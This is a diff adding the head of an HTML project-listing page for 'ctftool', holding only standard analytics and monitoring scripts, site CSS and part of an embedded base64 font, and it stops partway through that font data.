@@ -1,0 +1,1872 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<script>window.NREUM||(NREUM={});NREUM.info={"beacon":"bam-cell.nr-data.net","errorBeacon":"bam-cell.nr-data.net","licenseKey":"98ebaa2fbd","applicationID":"233526624","transactionName":"c11aERNaXltSERdDR19YUQYVGltZUwZA","queueTime":2,"applicationTime":90,"agent":""}</script>
+<script>(window.NREUM||(NREUM={})).loader_config={licenseKey:"98ebaa2fbd",applicationID:"233526624"};window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var i=t[n]={exports:{}};e[n][0].call(i.exports,function(t){var i=e[n][1][t];return r(i||t)},i,i.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var i=0;i<n.length;i++)r(n[i]);return r}({1:[function(e,t,n){function r(){}function i(e,t,n){return function(){return o(e,[u.now()].concat(c(arguments)),t?null:this,n),t?void 0:this}}var o=e("handle"),a=e(6),c=e(7),f=e("ee").get("tracer"),u=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],p="api-",l=p+"ixn-";a(d,function(e,t){s[t]=i(p+t,!0,"api")}),s.addPageAction=i(p+"addPageAction",!0),s.setCurrentRouteName=i(p+"routeName",!0),t.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,t){var n={},r=this,i="function"==typeof t;return o(l+"tracer",[u.now(),e,n],r),function(){if(f.emit((i?"":"no-")+"fn-start",[u.now(),r,i],n),i)try{return t.apply(this,arguments)}catch(e){throw f.emit("fn-err",[arguments,this,e],n),e}finally{f.emit("fn-end",[u.now()],n)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){m[t]=i(l+t)}),newrelic.noticeError=function(e,t){"string"==typeof e&&(e=new Error(e)),o("err",[e,u.now(),!1,t])}},{}],2:[function(e,t,n){function r(){return c.exists&&performance.now?Math.round(performance.now()):(o=Math.max((new Date).getTime(),o))-a}function i(){return o}var o=(new Date).getTime(),a=o,c=e(8);t.exports=r,t.exports.offset=a,t.exports.getLastTimestamp=i},{}],3:[function(e,t,n){function r(e,t){var n=e.getEntries();n.forEach(function(e){"first-paint"===e.name?d("timing",["fp",Math.floor(e.startTime)]):"first-contentful-paint"===e.name&&d("timing",["fcp",Math.floor(e.startTime)])})}function i(e,t){var n=e.getEntries();n.length>0&&d("lcp",[n[n.length-1]])}function o(e){e.getEntries().forEach(function(e){e.hadRecentInput||d("cls",[e])})}function a(e){if(e instanceof m&&!g){var t=Math.round(e.timeStamp),n={type:e.type};t<=p.now()?n.fid=p.now()-t:t>p.offset&&t<=Date.now()?(t-=p.offset,n.fid=p.now()-t):t=p.now(),g=!0,d("timing",["fi",t,n])}}function c(e){d("pageHide",[p.now(),e])}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var f,u,s,d=e("handle"),p=e("loader"),l=e(5),m=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){f=new PerformanceObserver(r);try{f.observe({entryTypes:["paint"]})}catch(v){}u=new PerformanceObserver(i);try{u.observe({entryTypes:["largest-contentful-paint"]})}catch(v){}s=new PerformanceObserver(o);try{s.observe({type:"layout-shift",buffered:!0})}catch(v){}}if("addEventListener"in document){var g=!1,w=["click","keydown","mousedown","pointerdown","touchstart"];w.forEach(function(e){document.addEventListener(e,a,!1)})}l(c)}},{}],4:[function(e,t,n){function r(e,t){if(!i)return!1;if(e!==i)return!1;if(!t)return!0;if(!o)return!1;for(var n=o.split("."),r=t.split("."),a=0;a<r.length;a++)if(r[a]!==n[a])return!1;return!0}var i=null,o=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var c=navigator.userAgent,f=c.match(a);f&&c.indexOf("Chrome")===-1&&c.indexOf("Chromium")===-1&&(i="Safari",o=f[1])}t.exports={agent:i,version:o,match:r}},{}],5:[function(e,t,n){function r(e){function t(){e(a&&document[a]?document[a]:document[i]?"hidden":"visible")}"addEventListener"in document&&o&&document.addEventListener(o,t,!1)}t.exports=r;var i,o,a;"undefined"!=typeof document.hidden?(i="hidden",o="visibilitychange",a="visibilityState"):"undefined"!=typeof document.msHidden?(i="msHidden",o="msvisibilitychange"):"undefined"!=typeof document.webkitHidden&&(i="webkitHidden",o="webkitvisibilitychange",a="webkitVisibilityState")},{}],6:[function(e,t,n){function r(e,t){var n=[],r="",o=0;for(r in e)i.call(e,r)&&(n[o]=t(r,e[r]),o+=1);return n}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],7:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,i=n-t||0,o=Array(i<0?0:i);++r<i;)o[r]=e[t+r];return o}t.exports=r},{}],8:[function(e,t,n){t.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,t,n){function r(){}function i(e){function t(e){return e&&e instanceof r?e:e?u(e,f,a):a()}function n(n,r,i,o,a){if(a!==!1&&(a=!0),!l.aborted||o){e&&a&&e(n,r,i);for(var c=t(i),f=v(n),u=f.length,s=0;s<u;s++)f[s].apply(c,r);var p=d[h[n]];return p&&p.push([b,n,r,c]),c}}function o(e,t){y[e]=v(e).concat(t)}function m(e,t){var n=y[e];if(n)for(var r=0;r<n.length;r++)n[r]===t&&n.splice(r,1)}function v(e){return y[e]||[]}function g(e){return p[e]=p[e]||i(n)}function w(e,t){s(e,function(e,n){t=t||"feature",h[n]=t,t in d||(d[t]=[])})}var y={},h={},b={on:o,addEventListener:o,removeEventListener:m,emit:n,get:g,listeners:v,context:t,buffer:w,abort:c,aborted:!1};return b}function o(e){return u(e,f,a)}function a(){return new r}function c(){(d.api||d.feature)&&(l.aborted=!0,d=l.backlog={})}var f="nr@context",u=e("gos"),s=e(6),d={},p={},l=t.exports=i();t.exports.getOrSetContext=o,l.backlog=d},{}],gos:[function(e,t,n){function r(e,t,n){if(i.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(o){}return e[t]=r,r}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){i.buffer([e],r),i.emit(e,t,n)}var i=e("ee").get("handle");t.exports=r,r.ee=i},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,o,function(){return i++})}var i=1,o="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!x++){var e=b.info=NREUM.info,t=p.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&t))return u.abort();f(y,function(t,n){e[t]||(e[t]=n)});var n=a();c("mark",["onload",n+b.offset],null,"api"),c("timing",["load",n]);var r=p.createElement("script");r.src="https://"+e.agent,t.parentNode.insertBefore(r,t)}}function i(){"complete"===p.readyState&&o()}function o(){c("mark",["domContent",a()+b.offset],null,"api")}var a=e(2),c=e("handle"),f=e(6),u=e("ee"),s=e(4),d=window,p=d.document,l="addEventListener",m="attachEvent",v=d.XMLHttpRequest,g=v&&v.prototype;NREUM.o={ST:setTimeout,SI:d.setImmediate,CT:clearTimeout,XHR:v,REQ:d.Request,EV:d.Event,PR:d.Promise,MO:d.MutationObserver};var w=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1194.min.js"},h=v&&g&&g[l]&&!/CriOS/.test(navigator.userAgent),b=t.exports={offset:a.getLastTimestamp(),now:a,origin:w,features:{},xhrWrappable:h,userAgent:s};e(1),e(3),p[l]?(p[l]("DOMContentLoaded",o,!1),d[l]("load",r,!1)):(p[m]("onreadystatechange",i),d[m]("onload",r)),c("mark",["firstbyte",a.getLastTimestamp()],null,"api");var x=0},{}],"wrap-function":[function(e,t,n){function r(e,t){function n(t,n,r,f,u){function nrWrapper(){var o,a,s,p;try{a=this,o=d(arguments),s="function"==typeof r?r(o,a):r||{}}catch(l){i([l,"",[o,a,f],s],e)}c(n+"start",[o,a,f],s,u);try{return p=t.apply(a,o)}catch(m){throw c(n+"err",[o,a,m],s,u),m}finally{c(n+"end",[o,a,p],s,u)}}return a(t)?t:(n||(n=""),nrWrapper[p]=t,o(t,nrWrapper,e),nrWrapper)}function r(e,t,r,i,o){r||(r="");var c,f,u,s="-"===r.charAt(0);for(u=0;u<t.length;u++)f=t[u],c=e[f],a(c)||(e[f]=n(c,s?f+r:r,i,f,o))}function c(n,r,o,a){if(!m||t){var c=m;m=!0;try{e.emit(n,r,o,t,a)}catch(f){i([f,n,r,o],e)}m=c}}return e||(e=s),n.inPlace=r,n.flag=p,n}function i(e,t){t||(t=s);try{t.emit("internal-error",e)}catch(n){}}function o(e,t,n){if(Object.defineProperty&&Object.keys)try{var r=Object.keys(e);return r.forEach(function(n){Object.defineProperty(t,n,{get:function(){return e[n]},set:function(t){return e[n]=t,t}})}),t}catch(o){i([o],n)}for(var a in e)l.call(e,a)&&(t[a]=e[a]);return t}function a(e){return!(e&&e instanceof Function&&e.apply&&!e[p])}function c(e,t){var n=t(e);return n[p]=e,o(e,n,s),n}function f(e,t,n){var r=e[t];e[t]=c(r,n)}function u(){for(var e=arguments.length,t=new Array(e),n=0;n<e;++n)t[n]=arguments[n];return t}var s=e("ee"),d=e(7),p="nr@original",l=Object.prototype.hasOwnProperty,m=!1;t.exports=r,t.exports.wrapFunction=c,t.exports.wrapInPlace=f,t.exports.argsToArray=u},{}]},{},["loader"]);</script>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-6242674-23"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-6242674-23', { 'optimize_id': 'GTM-T48MRN9'});
+    </script>
+
+    <title>Ctftool</title>
+<meta name="description" content="Interactive CTF Exploration Tool">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://awesomeopensource.com/project/taviso/ctftool">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+
+      /* copy template below */
+      /* ------------------- */
+      /* ----------------- */
+      /* ----------------- */
+
+      /*ipad and below */
+
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+
+      }
+
+      /* end template copy */
+      /* ----------------- */
+      /* ----------------- */
+      /* ----------------- */
+
+      /*ipad and below */
+      .show_on_phones {
+        display: block;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .show_on_phones {
+          display: none;
+        }
+      }
+
+      .twenty_px_padding_top {
+        padding-top: 20px;
+      }
+
+      /*ipad and below */
+      .projects_category_explorer_left_column {
+        max-width: 0;
+        margin-right: 0;
+        display: none;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .projects_category_explorer_left_column {
+          min-width: 20%;
+          margin-right: 5%;
+          display: block;
+        }
+      }
+
+      /*ipad and below */
+      .projects_list_right_column {
+        min-width: 100%;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .projects_list_right_column {
+          min-width: 75%;
+        }
+      }
+
+      .display_flex {
+        display: flex;
+      }
+
+      .margin_bottom_15 {
+        margin-bottom: 15px;
+      }
+
+      /*ipad and below */
+      .image-gallery-image {
+        width: 100% !important;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .image-gallery-image {
+          width: 1280px !important;
+        }
+      }
+
+      /*ipad and below */
+      .aos_sponsorship_link {
+        font-size: 14px;
+        font-weight: bold;
+        color: blue;
+        text-decoration: underline;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_sponsorship_link {
+          font-size: 18px;
+          font-weight: bold;
+          color: blue;
+          text-decoration: underline;
+        }
+      }
+
+      /*ipad and below */
+      .aos_desktop_right_ads_container {
+        display: none;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_desktop_right_ads_container {
+          display: block;
+        }
+      }
+
+      /*ipad and below */
+      .aos_project_screen_container {
+        margin-left: 5%;
+        margin-right: 5%;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_screen_container {
+          margin-left: 5%;
+          margin-right: 0;
+          display: flex;
+        }
+      }
+
+      /*ipad and below */
+      .aos_project_inner_screen_container {
+        width: 100%;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_inner_screen_container {
+          width: 95%;
+        }
+      }
+
+      /*ipad and below
+      .aos_license_text_metadata {
+        margin-top: 0 !important;
+      }
+
+      everything larger than ipad
+      @media screen and (min-width: 1024px) {
+        .aos_license_text_metadata {
+          margin-top: 0 !important;
+        }
+      }*/
+
+      /*ipad and below */
+      .projects_list_ad_slot_1 {
+        height: fit-content;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .projects_list_ad_slot_1 {
+          height: fit-content;
+        }
+      }
+
+      /*ipad and below */
+      .projects_list_ad_slot_2 {
+        height: fit-content;
+        margin-top: -34px;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .projects_list_ad_slot_2 {
+          height: fit-content;
+          margin-top: 0;
+        }
+      }
+
+      /*ipad and below */
+      .project_page_ad_slot_1 {
+        display: block;
+        height: fit-content;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .project_page_ad_slot_1 {
+          display: block;
+          height: fit-content;
+        }
+      }
+
+      /*ipad and below */
+      .project_page_ad_slot_2 {
+        display: block;
+        height: fit-content;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .project_page_ad_slot_2 {
+          display: block;
+          height: fit-content;
+        }
+      }
+
+      /*ipad and below */
+      .aos_category_explorer_category_container {
+        background-color: white;
+        padding: 10px;
+        margin-bottom: 0px;
+        border-bottom: 1px solid lightgray;
+        border-left: 1px solid lightgray;
+        border-right: 1px solid lightgray;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_category_explorer_category_container {
+          background-color: white;
+          padding: 10px;
+          margin-bottom: 0px;
+          border-bottom: 1px solid lightgray;
+          border-left: 1px solid lightgray;
+          border-right: 1px solid lightgray;
+        }
+      }
+
+      .aos_category_explorer_category_container:first-child {
+        border-top: 1px solid lightgray;
+      }
+
+      /*ipad and below */
+      .aos_topic_count {
+        font-size: 10px;
+        color: #4f4f4f;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_topic_count {
+          font-size: 16px;
+          color: #4f4f4f;
+        }
+      }
+
+      /*ipad and below */
+      .aos_topic_icon {
+        display: none;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_topic_icon {
+          font-size: 14px;
+          display: inline-block;
+        }
+      }
+
+      /*ipad and below */
+      .aos_project_count {
+        color: #4f4f4f;
+        font-size: 14px;
+        font-weight: bold;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_count {
+          font-size: 14px;
+          font-weight: bold;
+        }
+      }
+
+      /*ipad and below */
+      .aos_project_star {
+        font-size: 14px;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_star {
+          font-size: 14px;
+          /*margin-right: 7px;*/
+        }
+      }
+
+      /*ipad and below */
+      .aos_project_metadata_trademark_notice {
+        font-size: 8px;
+        color: gray;
+        margin-top: 10px;
+        border-bottom: 1px solid lightgray;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_metadata_trademark_notice {
+          font-size: 12px;
+          color: gray;
+          margin-top: 20px;
+          border-bottom: 1px solid lightgray;
+        }
+      }
+
+      /*ipad and below */
+      .aos_project_metadata_description {
+        margin-bottom: 10px;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_metadata_description {
+          margin-bottom: 5px;
+        }
+      }
+
+      .aos_project_metadata {
+        display: inline-block;
+        margin-bottom: 10px;
+        width: 100%;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_metadata {
+          display: inline-block;
+          margin-bottom: 10px;
+          width: 100%;
+        }
+      }
+
+      /*ipad and below */
+      .aos_project_metadata_content {
+        /*border-bottom: 1px solid lightgray;*/
+        font-size: 16px;
+        color: #000000;
+        font-weight: 300;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_metadata_content {
+          /*border-bottom: 1px solid lightgray;*/
+          font-size: 16px;
+          color: #000000;
+          font-weight: 300;
+        }
+      }
+
+      /*ipad and below */
+      .aos_project_metadata_header {
+        color: #808080;
+        margin-bottom: 10px;
+        margin-top: 10px;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_metadata_header {
+          color: #808080;
+          margin-bottom: 10px;
+          margin-top: 10px;
+          font-size: 16px;
+        }
+      }
+
+      aos_project_metadata_header:hover {
+        color: #808080;
+      }
+
+      /*ipad and below */
+      .aos_project_metadata_title {
+        font-size: 20px;
+        margin-bottom: 5px;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_metadata_title {
+          font-size: 30px;
+          margin-bottom: 10px;
+        }
+      }
+
+      /*ipad and below */
+      .aos_app_container {
+        display: flex;
+        flex-direction: row;
+        width: 100%;
+        margin-bottom: 2px;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_app_container {
+          display: flex;
+          flex-direction: row;
+          width: 100%;
+          margin-bottom: 0;
+        }
+      }
+
+      @media screen and (min-width: 1025px) {
+        .aos_desktop_ad_spacer {
+          margin-top: 5px;
+          margin-bottom: 5px;
+        }
+      }
+
+      /*ipad and below */
+      .aos_show_ad_on_mobile {
+        display: none;
+      }
+
+      @media screen and (max-width: 1024px) {
+        .aos_show_ad_on_mobile {
+          /*display: inline-block;*/
+          display: block; /*adsense recommended*/
+        }
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1025px) {
+        .aos_show_ad_on_desktop {
+          /*display: inline-block;*/
+          display: block; /*adsense recommended*/
+        }
+      }
+
+      /*ipad and below */
+      @media screen and (max-width: 1024px) {
+        .aos_show_ad_on_desktop {
+          display: none;
+        }
+      }
+
+      /*ipad and below */
+      .aos_filter_topics_input {
+        font-size: 16px;
+        padding: 10px;
+        border: 1px solid lightgray;
+        background-color: white;
+        border-radius: 10px;
+        box-shadow: 1px 1px 5px lightgrey;
+        margin-bottom: 20px;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_filter_topics_input {
+          font-size: 20px;
+          padding: 10px;
+          border: 1px solid lightgray;
+          background-color: white;
+          border-radius: 10px;
+          box-shadow: 1px 1px 5px lightgrey;
+          margin-bottom: 20px;
+        }
+      }
+
+      /* ipad and below */
+      .aos_topics_project {
+        font-family: helvetica, arial, sans-serif;
+        font-size: 12px;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        width: 100%;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_topics_project {
+          font-family: helvetica, arial, sans-serif;
+          margin-bottom: 0;
+          font-size: 20px;
+          border-radius: 10px;
+          padding: 0;
+          display: flex;
+          flex-direction: column;
+          align-items: flex-start;
+          width: 100%;
+        }
+      }
+
+      /* ipad and below
+      .aos_topics_sidebar {
+        font-family: helvetica, arial, sans-serif;
+        font-size: 12px;
+        margin-left: 2%;
+        margin-right: 2%;
+        width: 94%;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+      }
+
+       everything larger than ipad
+      @media screen and (min-width: 1024px) {
+        .aos_topics_sidebar {
+          font-family: helvetica, arial, sans-serif;
+          margin-left: 5%;
+          margin-right: 2%;
+          width: 30%;
+          margin-bottom: 0;
+          font-size: 20px;
+          border-radius: 10px;
+          padding: 0;
+          display: flex;
+          flex-direction: column;
+        }
+      }*/
+
+      /*ipad and below */
+      .aos_pill_box {
+        display: flex;
+        color: black;
+        border-radius: 5px;
+        padding: 2px;
+        margin: 2px;
+        align-items: center;
+        border-color: black;
+        background-color: white;
+        font-size: 12px;
+        border: 1px solid black;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_pill_box {
+          display: flex;
+          color: black;
+          border-radius: 5px;
+          padding: 5px;
+          margin: 10px;
+          align-items: center;
+          border: 0;
+          background-color: white;
+          box-shadow: 1px 1px 10px 1px rgba(0,0,0,0.25);
+          font-size: 16px;
+        }
+      }
+
+      /*ipad and below */
+      .aos_selected_topics_text_container {
+        display: none;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_selected_topics_text_container {
+          margin-left: 25px;
+          margin-right: 10px;
+          margin-bottom: 10px;
+          margin-top: 10px;
+          padding: 5px;
+          font-weight: bold;
+          font-size: 20px;
+          white-space: nowrap;
+          display: inline-block;
+        }
+      }
+
+      /*ipad and below */
+      .aos_pagenavigator_links_container {
+        display: flex;
+        justify-content: space-around;
+        font-size: 12px;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_pagenavigator_links_container {
+          display: flex;
+          justify-content: space-around;
+          font-size: 16px;
+        }
+      }
+
+      /*ipad and below */
+      .aos_project_container {
+        padding-bottom: 20px;
+        padding-left: 0;
+        padding-right: 0;
+        padding-top: 5px;
+        width: 100%;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_container {
+          /*border-radius: 10px;*/
+          padding-bottom: 20px;
+          padding-left: 0;
+          padding-right: 0;
+          padding-top: 5px;
+          width: 100%;
+        }
+      }
+
+      /*ipad and below */
+      .aos_project_description {
+        font-size: 16px;
+        width: 100%;
+        font-weight: 300; /* match adsense */
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_description {
+          font-size: 16px;
+          font-weight: 300; /* match adsense */
+        }
+      }
+
+      /*ipad and below */
+      .aos_project_title {
+        font-size: 20px;
+        margin-bottom: 2px;
+        font-weight: 400; /* match adsense */
+        width: 100%;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_project_title {
+          font-size: 20px;
+          margin-bottom: 2px;
+          font-weight: 400; /* match adsense */
+        }
+      }
+
+      .aos_project_title a :hover {
+        text-decoration: none !important;
+      }
+
+      .aos_no_underline:hover {
+        text-decoration: none !important;
+      }
+
+      .aos_grey_link:hover {
+        color: #808080 !important;
+      }
+
+      .aos_grey_link {
+        color: #808080 !important;
+      }
+
+      /*ipad and below */
+      .category_topic_filter_container {
+        width: 94%;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .category_topic_filter_container {
+          width: 94%;
+        }
+      }
+
+      /*ipad and below */
+      .aos_projects_container {
+        font-family: helvetica, arial, sans-serif;
+        margin-right: 2%;
+        width: 96%; /* won't insert an ad this small (68%), but bigger and it overflows to the right with some topics that are long */
+        font-size: 14px;
+        margin-bottom: 5px;
+        margin-left: 2%;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_projects_container {
+          font-family: helvetica, arial, sans-serif;
+          margin-right: 0;
+          width: 90%; /* was 53 before removing right margin spacer / ad container */
+          font-size: 18px;
+          margin-bottom: 5px;
+          min-width: 800px;
+          margin-left: 5%;
+        }
+      }
+
+      /*ipad and below */
+      .aos_pagenavigator_container {
+        display: flex;
+        justify-content: center;
+        font-size: 9px;
+        margin-bottom: 0;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_pagenavigator_container {
+          display: flex;
+          justify-content: center;
+          font-size: 16px;
+          margin-bottom: 10px;
+        }
+      }
+
+      /*ipad and below */
+      .aos_header_title_container_ipad_and_smaller {
+        font-size: 12px;
+        font-weight: bold;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 134px;
+        white-space: nowrap;
+        flex-direction: column;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_header_title_container_ipad_and_smaller {
+          display: none;
+        }
+      }
+
+
+      /*ipad and below */
+      .aos_header_title_container_larger_than_ipad {
+        display: none;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_header_title_container_larger_than_ipad {
+          display: block;
+        }
+      }
+
+      /*ipad and below */
+      .aos_logo_image {
+        height: 25px;
+        width: 25px;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_logo_image {
+          height: 50px;
+          width: 50px;
+        }
+      }
+
+      /*ipad and below */
+      .aos_fixed_footer_container {
+        display: flex;
+        margin-left: 0;
+        margin-right: 0;
+        margin-top: 2px;
+        width: 100%;
+        justify-content: center;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_fixed_footer_container {
+          display: flex;
+          margin-left: 5%;
+          margin-right: 20%;
+          margin-top: 5px;
+          margin-bottom: 5px;
+          width: 75%;
+          justify-content: center;
+        }
+      }
+
+      /*ipad and below */
+      .aos_fixed_header_container {
+        margin-left: 2%;
+        margin-right: 2%;
+        margin-top: 4px;
+        margin-bottom: 2px;
+        width: 96%;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_fixed_header_container {
+          margin-left: 5%;
+          margin-right: 20%;
+          margin-top: 5px;
+          margin-bottom: 5px;
+          width: 75%;
+        }
+      }
+
+      /*ipad and below */
+      body {
+        margin-top: 0;
+        margin-right: 0;
+        margin-bottom: 0;
+        margin-left: 0;
+        padding: 0
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        body {
+          margin-top: 0;
+          margin-right: 0;
+          margin-bottom: 0;
+          margin-left: 0;
+          padding: 0
+        }
+      }
+
+      /* ipad and below */
+      .aos_topics_sidebar_link {
+        width: 100%;
+        margin-bottom: 10px;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        font-size: 14px;
+      }
+
+      /* everything larger than ipad */
+      @media screen and (min-width: 1024px) {
+        .aos_topics_sidebar_link {
+          width: 100%;
+          margin-bottom: 10px;
+          font-size: 18px;
+        }
+      }
+
+      html {
+        margin: 0;
+        padding: 0
+      }
+
+      a {
+        color: #000000;
+        text-decoration: none;
+      }
+
+      a:visited {
+        text-decoration: none;
+      }
+
+      a:hover {
+        /*color: #0366d6;*/
+        color: #000000; /* match adsense */
+        text-decoration: underline;
+      }
+
+      .AOS_Pill:hover {
+        text-decoration: none;
+      }
+
+      /* MIT licensed github-markdown.css */
+      /* https://github.com/sindresorhus/github-markdown-css */
+      @font-face {
+        font-family: octicons-link;
+        src: url(data:font/woff;charset=utf-8;base64,d09GRgABAAAAAAZwABAAAAAACFQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABEU0lHAAAGaAAAAAgAAAAIAAAAAUdTVUIAAAZcAAAACgAAAAoAAQAAT1MvMgAAAyQAAABJAAAAYFYEU3RjbWFwAAADcAAAAEUAAACAAJThvmN2dCAAAATkAAAABAAAAAQAAAAAZnBnbQAAA7gAAACyAAABCUM+8IhnYXNwAAAGTAAAABAAAAAQABoAI2dseWYAAAFsAAABPAAAAZwcEq9taGVhZAAAAsgAAAA0AAAANgh4a91oaGVhAAADCAAAABoAAAAkCA8DRGhtdHgAAAL8AAAADAAAAAwGAACfbG9jYQAAAsAAAAAIAAAACABiATBtYXhwAAACqAAAABgAAAAgAA8ASm5hbWUAAAToAAABQgAAAlXu73sOcG9zdAAABiwAAAAeAAAAME3QpOBwcmVwAAAEbAAAAHYAAAB/aFGpk3jaTY6xa8JAGMW/O62BDi0tJLYQincXEypYIiGJjSgHniQ6umTsUEyLm5BV6NDBP8Tpts6F0v+k/0an2i+itHDw3v2+9+DBKTzsJNnWJNTgHEy4BgG3EMI9DCEDOGEXzDADU5hBKMIgNPZqoD3SilVaXZCER3/I7AtxEJLtzzuZfI+VVkprxTlXShWKb3TBecG11rwoNlmmn1P2WYcJczl32etSpKnziC7lQyWe1smVPy/Lt7Kc+0vWY/gAgIIEqAN9we0pwKXreiMasxvabDQMM4riO+qxM2ogwDGOZTXxwxDiycQIcoYFBLj5K3EIaSctAq2kTYiw+ymhce7vwM9jSqO8JyVd5RH9gyTt2+J/yUmYlIR0s04n6+7Vm1ozezUeLEaUjhaDSuXHwVRgvLJn1tQ7xiuVv/ocTRF42mNgZGBgYGbwZOBiAAFGJBIMAAizAFoAAABiAGIAznjaY2BkYGAA4in8zwXi+W2+MjCzMIDApSwvXzC97Z4Ig8N/BxYGZgcgl52BCSQKAA3jCV8CAABfAAAAAAQAAEB42mNgZGBg4f3vACQZQABIMjKgAmYAKEgBXgAAeNpjYGY6wTiBgZWBg2kmUxoDA4MPhGZMYzBi1AHygVLYQUCaawqDA4PChxhmh/8ODDEsvAwHgMKMIDnGL0x7gJQCAwMAJd4MFwAAAHjaY2BgYGaA4DAGRgYQkAHyGMF8NgYrIM3JIAGVYYDT+AEjAwuDFpBmA9KMDEwMCh9i/v8H8sH0/4dQc1iAmAkALaUKLgAAAHjaTY9LDsIgEIbtgqHUPpDi3gPoBVyRTmTddOmqTXThEXqrob2gQ1FjwpDvfwC